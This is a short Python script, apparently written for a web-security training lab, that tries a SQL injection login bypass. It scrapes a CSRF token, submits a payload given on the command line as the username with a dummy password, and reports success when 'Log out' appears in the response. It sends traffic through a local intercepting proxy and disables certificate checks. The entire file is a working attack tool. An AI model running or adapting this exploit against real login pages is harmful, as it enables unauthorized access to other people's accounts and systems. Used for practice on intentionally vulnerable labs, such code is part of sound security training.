import sys
import requests
import urllib3
from bs4 import BeautifulSoup



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf" : csrf,
            "username" : payload,
            "password" : "blank"}
    r = s.post(url, data=data, verify=False, proxies=proxies)
    response = r.text
    if "Log out" in response:
        return True
    else:
        return False



if __name__ == "__main__" :
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()

    if exploit_sqli(s,url,payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")

